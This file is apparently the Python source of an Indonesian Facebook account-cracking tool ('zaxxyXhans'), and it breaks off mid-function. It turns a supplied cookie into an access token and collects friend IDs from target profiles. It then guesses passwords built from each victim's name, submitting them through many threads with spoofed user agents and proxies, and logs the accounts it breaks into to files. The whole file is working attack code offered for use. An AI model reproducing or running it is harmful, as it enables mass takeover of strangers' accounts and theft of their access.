###----------[ IMPORT MODULE ]----------###
import requests,json,os,sys,random,datetime,time,re,platform,rich
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
from concurrent.futures import ThreadPoolExecutor as tred
from rich import print as ketik
from rich.panel import Panel as tabel
from concurrent.futures import ThreadPoolExecutor as zaxxy 
from rich.panel import Panel as panel
from rich.panel import Panel as nel
from rich import print as cetak
from time import sleep as waktu
from rich.markdown import Markdown as mark
from rich.console import Console as sol
from time import time as TimeTegar
from rich.tree import Tree
from rich import print as prints
from bs4 import BeautifulSoup as parser
hp = platform.platform()

###----------[ GLOBAL NAMA ]----------###
id,id2,uid = [],[],[]
xbz,xnxx = [],[]
tokenefb = []
akunyeh = []
usragent = []
tokenku = []
usrgent2 = []
loop,baz = 0,[]
ok,cp,oo = 0,0,[]
af = 0
ualu,ualuh = [],[]
CON=sol()

#----------[ GLOBAL-NAME ]----------#
id, id2, uid = [],[],[]
tokene, akune = [],[]
sandine, sandina = [],[]
method, ugen = [],[]
loop, ok, cp = 0,0,0

###----------[ GLOBAL NAMA ]----------###
id,id2,uid = [],[],[]
xbz,xnxx = [],[]
tokenefb = []
akunyeh = []
usragent = []
tokenku = []
usrgent2 = []
loop,baz = 0,[]
ok,cp,oo = 0,0,[]
af = 0
ualu,ualuh = [],[]
CON=sol()
#------------------[ USER-AGENT ]-------------------#

ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol={}&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print('[[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mZaxxxy')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(1000):
	rr = random.randint
	rc = random.choice
	ugent1 = f"Mozilla/5.0 (Linux; Android {str(rr(6,13))}; SM-G960U1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(75,130))}.0.{str(rr(2000,5999))}.{str(rr(75,200))} Mobile Safari/537.36"
	ugent2 = f"Mozilla/5.0 (Linux; Android {str(rr(6,13))}; HUAWEI RIO-L01 Build/HuaweiRIO-L01; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(75,130))}.0.{str(rr(2000,5999))}.{str(rr(75,200))} Mobile Safari/537.36"
	ugents3 = f"Mozilla/5.0 (iPad; CPU OS 7_0_4 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Mobile/11B554a [FBAN/FBIOS;FBBV/12376726;FBDV/iPad2,5;FBMD/iPad;FBSN/iPhone OS;FBSV/7.0.4;FBSS/1; FBCR/;FBID/tablet;FBLC/en_GB;FBOP/1]"
	ugent4 = f"Mozilla/5.0 (Linux; Android {str(rr(6,13))}; J9210 Build/55.2.A.4.229; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(75,130))}.0.{str(rr(2000,5999))}.{str(rr(75,200))} Mobile Safari/537.36"
	zaxxy = random.choice([ugent1,ugent2,ugents3,ugent4])
	ugen.append(zaxxy)
#--------[ GENERATE-USER-AGENT ]----------#
for generate in range(10):
	a=random.randrange(1, 9)
	b=random.randrange(1, 9)
	c=random.randrange(7, 13)
	c=random.randrange(73,100)
	d=random.randrange(4200,4900)
	e=random.randrange(40,150)
	uaku=f'Mozilla/5.0 (Linux; Android {a}.{b}; Pixel {b}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()
ua = random.choice(["Mozilla/5.0 (Linux; Android 11; CPH2493 Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/82.0.1531.64 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/411.0.0.13.36;]","Mozilla/5.0 (Linux; Android 10; SM-A700S Build/OPR6.142770.293; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.2114.112 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/348.0.0.12.57;]","Mozilla/5.0 (Linux; Android 9; Oneplus A99831 Build/OPR6.142770.293; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.1518.41 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/343.0.0.03.54;]","Mozilla/5.0 (Linux; Android 11; Black Shark 4S Build/SP2A.653342.342; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.2318.41 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/136.0.0.14.72;]","Mozilla/5.0 (Linux; Android 9; 22041219I Build/TP1A.904992.769; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.1431.179 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/156.0.0.23.66;]","Mozilla/5.0 (Linux; Android 11; CPH2493 Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.1734.2 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/321.0.0.02.33;]","Mozilla/5.0 (Linux; Android 11; SM-A700K Build/SD2A.276412.601; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.1576.83 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/469.0.0.23.21;]","Mozilla/5.0 (Linux; Android 10; Black Shark 4S Build/SP2A.653342.342; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.139.83 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/334.0.0.15.5;]","Mozilla/5.0 (Linux; Android 11; SM-A700K Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.2051.117 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/486.0.0.21.67;]","Mozilla/5.0 (Linux; Android 9; SM-A700K Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/67.0.78.94 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/218.0.0.15.17;]"])

###----------[ PEWARNA ]----------###
mer = '\033[1;31m'
kun = '\033[1;33m'
hijo = '\033[1;32m' 
biru = '\033[1;34m'
ung = '\033[1;35m'
puti = '\033[1;37m'
bira = '\033[1;36m'
xxx = '\33[m'
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
N = '\x1b[0m'
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m'  # DEFAULT
m = '\x1b[1;91m'  # RED +
k = '\033[93m'  # KUNING +
h = '\x1b[1;92m'  # HIJAU +
hh = '\033[32m'  # HIJAU -
u = '\033[95m'  # UNGU
kk = '\033[33m'  # KUNING -
b = '\33[1;96m'  # BIRU -
p = '\x1b[0;34m'  # BIRU +
# Warna
H = ('\x1b[1;90m')
M = ('\x1b[1;91m')
H = ('\x1b[1;92m')
K = ('\x1b[1;93m')
T = ('\x1b[1;94m')
U = ('\x1b[1;95m')
B = ('\x1b[1;96m')
P = ('\x1b[1;97m')
A = "\x1b[38;5;248m"
J = "\x1b[38;5;208m"
Z = "\x1b[0;90m"
asu = random.choice([m, k, h, u, b])
# ------------[ WARNA-COLOR ]--------------#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
N = '\x1b[0m'
Z = "\033[1;30m"
###----------[ CONVERT BULAN ]----------###
rb = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mei','6':'Juni','7':'Juli','8':'Agustus','9':'September','10':'Oktober','11':'November','12':'Desember'}
tg = datetime.datetime.now().day
bl = rb[(str(datetime.datetime.now().month))]
th = datetime.datetime.now().year
okh = 'OK-'+str(tg)+'-'+str(bl)+'-'+str(th)+'.txt'
cph = 'CP-'+str(tg)+'-'+str(bl)+'-'+str(th)+'.txt'
afh = 'A2F-'+str(tg)+'-'+str(bl)+'-'+str(th)+'.txt'

###----------[ UNTUK ANIMASI ]----------###
def alvino_xy(u):
    for e in u + "\n":
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.05)


def clear():
    os.system('clear')


def back():
    login()
def baz_anim(berjalan):
        for gas in berjalan + "\n":sys.stdout.write(gas);sys.stdout.flush();time.sleep(0.05)
def baz_bann(berjalan):
        for gas in berjalan + "\n":sys.stdout.write(gas);sys.stdout.flush();time.sleep(0.01)
     
###----------[ BANNER MENUH ]----------###
def banner():
	cetak(panel(f"""

  ▒███████▒ ▄▄▄      ▒██   ██▒▒██   ██▒▓██   ██▓   
▒ ▒ ▒ ▄▀░▒████▄    ▒▒ █ █ ▒░▒▒ █ █ ▒░ ▒██  ██▒   
░ ▒ ▄▀▒░ ▒██  ▀█▄  ░░  █   ░░░  █   ░  ▒██ ██░   
  ▄▀▒   ░░██▄▄▄▄██  ░ █ █ ▒  ░ █ █ ▒   ░ ▐██▓░   
▒███████▒ ▓█   ▓██▒▒██▒ ▒██▒▒██▒ ▒██▒  ░ ██▒▓░   
░▒▒ ▓░▒░▒ ▒▒   ▓▒█░▒▒ ░ ░▓ ░▒▒ ░ ░▓ ░   ██▒▒▒    
░░▒ ▒ ░ ▒  ▒   ▒▒ ░░░   ░▒ ░░░   ░▒ ░ ▓██ ░▒░    
░ ░ ░ ░ ░  ░   ▒    ░    ░   ░    ░   ▒ ▒ ░░     
  ░ ░          ░  ░ ░    ░   ░    ░   ░ ░        
░                                     ░ ░        
                                            
                                            
             """,width=60,title=f"zaxxyXhans",style=f"bold blue"))                                                   
	
#kukis
def login():
    try:
        token = open('.token.txt', 'r').read()
        cok = open('.cok.txt', 'r').read()
        tokenku.append(token)
        try:
            sy = requests.get(
                'https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie': cok})
            sy2 = json.loads(sy.text)['name']
            sy3 = json.loads(sy.text)['id']
            menu(sy2, sy3)
        except KeyError:
            login_lagi334()
        except requests.exceptions.ConnectionError:
            print('◉━━─ ConnectionError')
            exit()
    except IOError:
        login_lagi334()


def login_lagi334():
    try:
        os.system('clear')
        banner()
        ses = requests.Session()
        cok = input('\n◉━━─ input your cookie : ')
        ses.headers.update(
            {
                'content-type': 'application/x-www-form-urlencoded',
            }
        )
        data = {
            'access_token': '1348564698517390|007c0a9101b9e1c8ffab727666805038',
            'scope': ''
        }
        response = json.loads(
            ses.post('https://graph.facebook.com/v2.6/device/login/', data=data).text)
        code, user_code = response['code'], response['user_code']
        verification_url, status_url = ('https://m.facebook.com/device?user_code={}'.format(user_code)), (
            'https://graph.facebook.com/v2.6/device/login_status?method=post&code={}&access_token=1348564698517390%7C007c0a9101b9e1c8ffab727666805038&callback=LeetsharesCallback'.format(code))
        ses.headers.pop(
            'content-type'
        )
        ses.headers.update(
            {
                'sec-fetch-mode': 'navigate',
                'user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36',
                'sec-fetch-site': 'cross-site',
                'Host': 'm.facebook.com',
                        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                        'sec-fetch-dest': 'document',
            }
        )
        response2 = ses.get(verification_url, cookies={'cookie': cok}).text
        if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
            exit('\n◉━━─ Cookies Invalid my brother')
        else:
            action = re.search('action="(.*?)">', str(response2)
                               ).group(1).replace('amp;', '')
            fb_dtsg = re.search(
                'name="fb_dtsg" value="(.*?)"', str(response2)).group(1)
            jazoest = re.search(
                'name="jazoest" value="(\d+)"', str(response2)).group(1)
            data = {
                'fb_dtsg': fb_dtsg,
                'jazoest': jazoest,
                'qr': 0,
                'user_code': user_code,
            }
            ses.headers.update(
                {
                    'origin': 'https://m.facebook.com',
                    'referer': verification_url,
                    'content-type': 'application/x-www-form-urlencoded',
                    'sec-fetch-site': 'same-origin',
                }
            )
            response3 = ses.post(
                'https://m.facebook.com{}'.format(action), data=data, cookies={'cookie': cok})
            if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
                ses.headers.pop(
                    'content-type'
                )
                ses.headers.pop(
                    'origin'
                )
                response4 = ses.post(response3.url, data=data, cookies={
                                     'cookie': cok}).text
                action = re.search(
                    'action="(.*?)"', str(response4)).group(1).replace('amp;', '')
                fb_dtsg = re.search(
                    'name="fb_dtsg" value="(.*?)"', str(response4)).group(1)
                jazoest = re.search(
                    'name="jazoest" value="(\d+)"', str(response4)).group(1)
                scope = re.search('name="scope" value="(.*?)"',
                                  str(response4)).group(1)
                display = re.search(
                    'name="display" value="(.*?)"', str(response4)).group(1)
                user_code = re.search(
                    'name="user_code" value="(.*?)"', str(response4)).group(1)
                logger_id = re.search(
                    'name="logger_id" value="(.*?)"', str(response4)).group(1)
                auth_type = re.search(
                    'name="auth_type" value="(.*?)"', str(response4)).group(1)
                encrypted_post_body = re.search(
                    'name="encrypted_post_body" value="(.*?)"', str(response4)).group(1)
                return_format = re.search(
                    'name="return_format\\[\\]" value="(.*?)"', str(response4)).group(1)
                ses.headers.update(
                    {
                        'origin': 'https://m.facebook.com',
                        'referer': response3.url,
                        'content-type': 'application/x-www-form-urlencoded',
                    }
                )
                data = {
                    'fb_dtsg': fb_dtsg,
                    'jazoest': jazoest,
                    'scope': scope,
                    'display': display,
                    'user_code': user_code,
                    'logger_id': logger_id,
                    'auth_type': auth_type,
                    'encrypted_post_body': encrypted_post_body,
                    'return_format[]': return_format,
                }
                response5 = ses.post(
                    'https://m.facebook.com{}'.format(action), data=data, cookies={'cookie': cok}).text
                windows_referer = re.search(
                    'window.location.href="(.*?)"', str(response5)).group(1).replace('\\', '')
                ses.headers.pop(
                    'content-type'
                )
                ses.headers.pop(
                    'origin'
                )
                ses.headers.update(
                    {
                        'referer': 'https://m.facebook.com/',
                    }
                )
                response6 = ses.get(windows_referer, cookies={
                                    'cookie': cok}).text
                if 'Sukses!' in str(response6):
                    ses.headers.update(
                        {
                            'sec-fetch-mode': 'no-cors',
                            'referer': 'https://graph.facebook.com/',
                            'Host': 'graph.facebook.com',
                                    'accept': '*/*',
                                    'sec-fetch-dest': 'script',
                                    'sec-fetch-site': 'cross-site',
                        }
                    )
                    response7 = ses.get(status_url, cookies={
                                        'cookie': cok}).text
                    tok = re.search('"access_token": "(.*?)"',
                                    str(response7)).group(1)
                    tokenw = open(".token.txt", "w").write(tok)
                    cokiew = open(".cok.txt", "w").write(cok)
                    print(
                        f"\n◉━━─ Login was successful, re-execute my brother's command")
                else:
                    exit('\n◉━━─ login failed my brother')

    except Exception as e:
        print('\n◉━━─ Cookies Invalid my brother')
        os.system('rm -rf .emailbukan.txt && rm -rf .akunbukan.txt')
        print(e)
        exit()
###----------[ BAGIAN MENU ]----------###
def menu(my_name,my_id):
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		print('[×] Cookies Kadaluarsa ')
		time.sleep(5)
		login_lagi334()
	os.system('clear')
	
	ip = requests.get("https://api.ipify.org").text
	banner()
	cetak(panel(f'[bold blue][[bold purple]•[/][bold blue]][/] [bold blue]Username : [bold purple]{my_name}[/]\n[bold blue][[bold purple]•[/][bold blue]][/] [bold blue]User Idz : [bold purple]{my_id}[/]\n[bold blue][[bold purple]•[/][bold blue]][/] [bold blue]User Ip  : [bold purple]{ip}[/][/] ',width=60,title=f"[bold purple]Infomasi",style=f"bold blue"))
	
	
	
	cetak(panel(f'[bold blue][[bold purple]01[/][bold blue]][/] [bold blue]MULAI CRACK [[bold purple] ON [bold blue]][/]\n[bold blue][[bold purple]02[/][bold blue]][/] [bold blue]CEK HASIL [[bold purple] ON [bold blue]][/]\n[bold blue][[bold purple]03[/][bold blue]][/] [bold blue]LOG OUT [[bold purple] ON [bold blue]][/]',width=60,title=f"[bold blue]List Menu",style=f"bold blue"))
	
	_____PRINCE__ZAX_____ = input(f'pilih : ');print('')
	if _____PRINCE__ZAX_____ in ['1']:
		dump_massal()
	elif _____PRINCE__ZAX_____ in ['2']:
		result()
	elif _____PRINCE__ZAX_____ in ['0']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		print(f'Sukses Logout ')
		exit()
	else:
		print(f'Pilih Yang Bener Asu ')
		back()
def error():
	print(f'Maaf Fitur Ini Masih Di Perbaiki {x}')
	time.sleep(4)
	back()
#---atur id----#	
def setid():
     rr = random.randint
     for fixx in id:
            randy = rr(0,len(id2))
            id2.insert(randy, fixx)
            setting()
###----------[ DUMP ID PUBLIK ]----------###
def dump_massal():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
	    exit()
	try:
		kumpulkan = int(input(f'{m}╰── Berapa Id Yang Mah Dicrack? : {B}'))
	except ValueError:
	    exit()
	if kumpulkan<1 or kumpulkan>1000:
	    exit()
	ses=requests.Session()
	bilangan = 0
	for KOTG49H in range(kumpulkan):
		bilangan+=1
		Masukan = input(f'{m}╰── Masukkan Id Yang Ke '+str(bilangan)+f' : {B}')
		uid.append(Masukan)
	for user in uid:
	    try:
	       head = (
	       {"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36"
	       })
	       if len(id) == 0:
	           params = (
	           {
	           'access_token': token,
	           'fields': "friends"
	           }	          
	       )
	       else:
	           params = (
	           {
	           'access_token': token,
	           'fields': "friends"
	           }	           
	       )
	       url = requests.get('https://graph.facebook.com/{}'.format(user),params=params,headers=head,cookies={'cookies':cok}).json()
	       for xr in url['friends']['data']:
	           try:
	               woy = (xr['id']+'|'+xr['name'])
	               if woy in id:pass
	               else:id.append(woy)
	           except:continue
	    except (KeyError,IOError):
	      pass
	    except requests.exceptions.ConnectionError:
	        exit()
	try:
	      cetak(panel(f"\r[bold green]🔥Sukses Mengumpulkan [bold green]{len(id)}[bold purple] Id🔥",width=35,style=f"bold blue"))
	      setid()
	except requests.exceptions.ConnectionError:
	    exit()
	except (KeyError,IOError):
		exit()
#-------------------[YE]--------------------#    
def result():
	cetak(panel(f'[bold blue][[bold purple]01[/][bold blue]][/] [bold blue]HASIL OK [[bold purple] ON [bold blue]][/]\n[bold blue][[bold purple]02[/][bold blue]][/] [bold blue]HASIL CP [[bold purple] ON [bold blue]][/]\n[bold blue][[bold purple]03[/][bold blue]][/] [bold blue]KEMBALI [[bold purple] ON [bold blue]][/]',width=60,title=f"[bold blue]Cek hasil",style=f"bold blue"))
	kz = input(f'pilih : ');print('')
	if kz in ['2']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			print(f'File Tidak Di Temukan ')
			time.sleep(3)
			back()
		if len(vin)==0:
			print(f'Anda Tidak Memiliki Hasil CP ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = ''+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'%s.%s ({k} %s {x}Idz )'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print('('+str(cih)+') '+isi+' ( '+str(len(hem))+' Account )'+x)
			geeh = input('\npilih : ');print('')
			try:geh = lol[geeh]
			except KeyError:
				print(f'Pilih Yang Bener Kontol ')
				back()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				print(f'File Tidak Di Temukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print(f'{x}{k}{cpkuni[0]}|{cpkuni[1]}')
				nocp +=1
			print('')
			input(f'{x}[{m} Klik Enter{x} ]')
			back()
	elif kz in ['1']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			print(f'File Tidak Di Temukan ')
			time.sleep(2)
			back()
		if len(vin)==0:
			print(f'Anda Tidak Mempunyai File OK ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = ''+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'%s.%s ( {h}%s{x} Idz )'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print(f'%s.%s ({h} %s {x}Idz )'%(cih,isi,(len(hem))))
			geeh = input(f'\npilih : ');print('')
			try:geh = lol[geeh]
			except KeyError:
				print(f'Pilih Yang Bener Kontol ')
				back()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				print(f'File Tidak Di Temukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print('')
				print(f'{x}{h}{cpkuni[0]}|{cpkuni[1]}|{cpkuni[2]}')
				nocp +=1
			print('')
			input(f'{x}[{m} Klik Enter{x} ]')
			back()
	elif kz in ['3']:
		back()
	else:
		print(f'Pilih Yang Bener Kontol ')
		back()        
###----------[ ATUR SBLUM KREK ]----------###
def setting():
	cetak(panel(f"[bold blue]01.old\n02.new\n03.random",width=45,style=f"bold red"))
	
	aturid = input(f'{xxx} : ')
	if aturid in ['1','01']:
		for akunlama in sorted(id):
			id2.append(akunlama)
	elif aturid in ['2','02']:
		xbaru=[]
		for baru in sorted(id):
			xbaru.append(baru)
		bkp=len(xbaru)
		bkpp=(bkp-1)
		for miyabi in range(bkp):
			id2.append(xbaru[bkpp])
			bkpp -=1
	elif aturid in ['3','03']:
		for acak in id:
			xnxx = random.randint(0,len(id2))
			id2.insert(xnxx,acak)
	else:
		waktu(1)
		atur_dulu()
		exit()
		

	cetak(panel(f'[bold blue][[bold purple]01[/][bold blue]][/] [bold blue]Vlidate  [[bold purple] RECOMENDED [bold blue]][/]',width=45,title=f"[bold purple]METHOD",style=f"bold blue"))
	metod = input(f'{xxx} : ')
	if metod in ['1','01']:
		baz.append('metod1')
	else:
		baz.append('metod1')
	passwrd()

###----------[ BAGIAN PASSWORD ]----------###
def passwrd():
	global ok,cp
	print(f"{mer}──────────────────────────{puti}")
	print(f'{xxx}')
	awal = datetime.datetime.now()
	with tred(max_workers=30) as gas_krek:
		for aldous in id2:
			idf,nmf = aldous.split('|')[0],aldous.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			pwt = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(frs+'123')
					pwv.append(frs+'321')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'kamunanya')
					pwv.append(frs+'kamu nanya')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+'123')
					pwv.append(frs+'321')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
			if '><v><' in pwt:
				for xpwn in pwn:
					pwv.append(xpwn)
			else:pass
			if 'metod1' in baz:
				gas_krek.submit(metod1,idf,pwv,awal)
			else:
				gas_krek.submit(metod1,idf,pwv)
	print(f'{xxx}')
	print(f'{hijo}+ {puti}LIVE  : {hijo}%s{xxx} '%(ok))
	print(f'{kun}+ {puti}CP  : {kun}%s{xxx} '%(cp))
	print(f'{xxx}')
		
###----------[ METODE ]----------###
resok = []
rescp = []
def metod1(idf,pwv,awal):
	global loop,ok,cp
	jam_tayang = str(datetime.datetime.now()-awal).split('.')[0]
	sys.stdout.write(f" ZAXXY [{kun} {(loop)}{puti}/{hijo}{len(id)}{puti} ] [ {hijo}{(ok)}{xxx}/{kun}{(cp)}{xxx} ] \r");sys.stdout.flush()
	ses = requests.Session()
	for pw in pwv:
		try:
			ua = random.choice(ugen)
			scupv = ['"8.0.0"','"9.0.0"','"10.0.0"','"11.0.0"','"12.0.0"','"13.0.0"']
			bahasa = random.choice(["id-ID,id;q=0.9","en-US,en;q=0.9","en-GB,en;q=0.9","bd-BD,bd;q=0.9","es-LA,es;q=0.9","es-MX,es;q=0.9"])
			link = ses.get(f"https://m.prod.facebook.com/login.php?skip_api_login=1&api_key=3213804762189845&kid_directed_site=0&app_id=3213804762189845&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.1%2Fdialog%2Foauth%3Fclient_id%3D3213804762189845%26redirect_uri%3Dhttps%253A%252F%252Fwww.capcut.com%252Fpassport%252Fweb%252Fweb_login_success%26scope%3Demail%26state%3D0053afca3gAToVCgoVPZIGY3NGIxZTM4YjU5Zjg5ZmNkNTkxNWUyZWZmNzMyYjQxoU7ZOmh0dHBzOi8vd3d3LmNhcGN1dC5jb20vbHYvdjEvdXNlci93ZWIvbG9naW4vdGhpcmRfY2FsbGJhY2uhVgGhSQChRAChQdIABVAcoU0AoUiud3d3LmNhcGN1dC5jb22hUgKiUEzRBuymQUNUSU9OqXVuZGVmaW5lZKFM2SJodHRwczovL3d3dy5jYXBjdXQuY29tL2lkLWlkL2xvZ2luoVTZIDJkNzg1MGFiZmFiODNjNWUxYjU2MGExODBjYzA3YzcwoVcAoUYAolNBAKFVwqJNTMI%25253D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Daf919600-a681-4aeb-a128-05e90339859f%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.capcut.com%2Fpassport%2Fweb%2Fweb_login_success%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D0053afca3gAToVCgoVPZIGY3NGIxZTM4YjU5Zjg5ZmNkNTkxNWUyZWZmNzMyYjQxoU7ZOmh0dHBzOi8vd3d3LmNhcGN1dC5jb20vbHYvdjEvdXNlci93ZWIvbG9naW4vdGhpcmRfY2FsbGJhY2uhVgGhSQChRAChQdIABVAcoU0AoUiud3d3LmNhcGN1dC5jb22hUgKiUEzRBuymQUNUSU9OqXVuZGVmaW5lZKFM2SJodHRwczovL3d3dy5jYXBjdXQuY29tL2lkLWlkL2xvZ2luoVTZIDJkNzg1MGFiZmFiODNjNWUxYjU2MGExODBjYzA3YzcwoVcAoUYAolNBAKFVwqJNTMI%25253D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
			data = {
'lsd': re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),
'jazoest': re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
'uid': idf,
'next': 'https://m.facebook.com/v14.0/dialog/oauth?app_id=1722713787887984&cbt=1715097816836&channel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df031bf89b0b7255b9%26domain%3Dwww.bilibili.tv%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.bilibili.tv%252Ffd06f532ef38800a6%26relation%3Dopener&client_id=1722713787887984&display=touch&domain=www.bilibili.tv&e2e=%7B%7D&fallback_redirect_uri=https%3A%2F%2Fwww.bilibili.tv%2Fid&locale=en_US&logger_id=f84c1322deb4265ed&origin=2&redirect_uri=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df1ef219de4f53749d%26domain%3Dwww.bilibili.tv%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.bilibili.tv%252Ffd06f532ef38800a6%26relation%3Dopener%26frame%3Dfd985bc43b6db818d&response_type=token%2Csigned_request%2Cgraph_domain&scope=email&sdk=joey&version=v14.0&ret=login&fbapp_pres=0&tp=unspecified',
'flow': 'login_no_pin',
'pass': pw,
}
			hider = {
			'Host': url,
			'content-length': '327',
			'cache-control': 'max-age=0',
			'dpr': f'{str(rr(1,5))}',
			'viewport-width': f'{str(rr(300,999))}',
			'sec-ch-ua': f'"Not)A.Brand";v="{str(rr(50,120))}", Chromium";v="{str(rr(50,130))}"',
			'sec-ch-ua-mobile': '?1',
			'sec-ch-ua-platform': "'Android'",
			'sec-ch-ua-platform-version': '{str(rr(5,14))}.0.0',
			'sec-ch-ua-model': 'CPH1923',
			'sec-ch-ua-full-version-list': f'"Not)A.Brand";v="{str(rr(50,120))}.0.0.0", "Chromium";v="{str(rr(99,120))}.0.{str(rr(5000,5999))}.{str(rr(1,10))}"',
			'sec-ch-prefers-color-scheme': 'dark',
			'upgrade-insecure-requests': '1',
			'origin': 'https://'+url,
			'content-type': 'application/x-www-form-urlencoded',
			'user-agent': ua,
			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
			'sec-fetch-site': 'same-origin',
			'sec-fetch-mode': 'navigate',
			'sec-fetch-user': '?1',
			'sec-fetch-dest': 'document',
